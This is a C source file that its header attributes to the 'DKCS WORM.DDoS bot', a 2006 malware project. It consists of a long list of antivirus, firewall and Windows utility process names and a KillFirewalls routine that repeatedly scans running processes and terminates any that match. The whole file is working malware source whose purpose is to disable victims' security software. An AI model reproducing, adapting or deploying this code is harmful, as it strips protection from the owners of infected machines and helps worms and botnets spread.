//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
#define NUM_PROCESSES ((int) (sizeof processes / sizeof processes [0]))
//-----------------------------------------------------------------
struct{
	char* szProcName;
}

processes[] =
{
	"_AVP32.EXE",
	"_AVPCC.EXE",
	"_AVPM.EXE",
	"AckWin32.exe",
	"ACKWIN32.EXE",
	"ALERTSVC.EXE",
	"ALOGSERV.EXE",
	"Anti-Trojan.exe",
	"ANTS.EXE",
	"ATCON.EXE",
	"ATCON.EXE",
	"ATUPDATER.EXE",
	"ATWATCH.EXE",
	"AutoDown.exe",
	"AutoTrace.exe",
	"AUTOUPDATE.EXE",
	"AVCONSOL.EXE",
	"AVGCC32.EXE",
	"AVGCTRL.EXE",
	"AVGSERV.EXE",
	"AvkServ.exe",
	"AVKSERV.EXE",
	"AVP.EXE",
	"AVP32.EXE",
	"AVPCC.EXE",
	"AVPM.EXE",
	"AVSYNMGR.EXE",
	"AVXMONITOR9X.EXE",
	"AVXMONITOR9X.EXE",
	"AVXMONITORNT.EXE",
	"AVXQUAR.EXE",
	"blackd.exe",
	"blackice.exe",
	"Claw95.exe",
	"Claw95cf.exe",
	"cleaner.exe",
	"cleaner3.exe",
	"cpd.exe",
	"DEFWATCH.EXE",
	"DOORS.EXE",
	"F-AGNT95.EXE",
	"FAST.EXE",
	"F-PROT95.EXE",
	"FRW.EXE",
	"FRW.EXE",
	"GUARD.EXE",
	"GUARD.EXE",
	"iamapp.exe",
	"IAMAPP.EXE",
	"iamserv.exe",
	"IAMSERV.EXE",
	"ICLOAD95.EXE",
	"ICLOADNT.EXE",
	"ICMON.EXE",
	"ICSUPP95.EXE",
	"ICSUPPNT.EXE",
	"IFACE.EXE",
	"IOMON98.EXE",
	"ISRV95.EXE",
	"JEDI.EXE",
	"LOCKDOWN2000.EXE",
	"LUCOMSERVER.EXE",
	"MCAGENT.EXE",
	"Mcshield.exe",
	"MCUPDATE.EXE",
	"MINILOG.EXE",
	"MONITOR.EXE",
	"MOOLIVE.EXE",
	"msconfig.exe", // std windows autorun utility
	"NAVAPW32.EXE",
	"NavLu32.exe",
	"NAVW32.EXE",
	"Navw32.exe",
	"NDD32.EXE",
	"NeoWatchLog.exe",
	"NeoWatchTray.exe",
	"NISSERV",
	"NISUM.EXE",
	"NMAIN.EXE",
	"NORMIST.EXE",
	"notstart.exe",
	"NPROTECT.EXE",
	"NSCHED32.EXE",
	"NTXconfig.exe",
	"Nupgrade.exe",
	"NVC95.EXE",
	"NWService.exe",
	"outpost.exe",
	"PCCIOMON.EXE",
	"PERSFW.EXE",
	"POP3TRAP.EXE",
	"POPROXY.EXE",
	"REALMON95.EXE",
	"regedit.exe", // std registry editor
	"Rescue.exe",
	"RTVSCN95.EXE",
	"Smc.exe",
	"SPHINX.EXE",
	"SPYXX.EXE",
	"SS3EDIT.EXE",
	"SWNETSUP.EXE",
	"SymProxySvc.exe",
	"SYNMGR.EXE",
	"TAUMON.EXE",
	"TC.EXE",
	"tca.exe",
	"TCA.EXE",
	"TCM.EXE",
	"TDS-3.EXE",
	"TFAK.EXE",
	"TRJSCAN.EXE",
	"VetTray.exe",
	"VPTRAY.EXE",
	"VSECOMR.EXE",
	"VSHWIN32.EXE",
	"VSMON.EXE",
	"VSSTAT.EXE",
	"WATCHDOG.EXE",
	"WebScanX.exe",
	"WEBSCANX.EXE",
	"WEBTRAP.EXE",
	"WGFE95.EXE",
	"WRADMIN.EXE",
	"WrAdmin.exe",
	"WRCTRL.EXE",
	"WrCtrl.exe",
	"ZATUTOR.EXE",
	"ZAUINST.EXE",
	"ZONEALARM.EXE"
};
//-----------------------------------------------------------------
DWORD WINAPI KillFirewalls(LPVOID){
	HANDLE hSnapShot;
	HANDLE hProcess;
	PROCESSENTRY32 pe;
	BOOL bProcessResult;

	while(1){
        hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		pe.dwSize = sizeof(PROCESSENTRY32);
		bProcessResult = Process32First(hSnapShot, &pe);
		while(bProcessResult){
			for(int i=0;i<NUM_PROCESSES;i++){
				if(strcmp(pe.szExeFile, processes[i].szProcName) == 0){
					hProcess = OpenProcess(PROCESS_TERMINATE, TRUE, pe.th32ProcessID);
					if(hProcess != NULL){
                        TerminateProcess(hProcess, 0);
					}
                    
				}
			}
			bProcessResult = Process32Next(hSnapShot, &pe);
            
		}
	Sleep(MY_MACRO_FIREWALL_KILL_DELAY*1000);
	}
}
//-----------------------------------------------------------------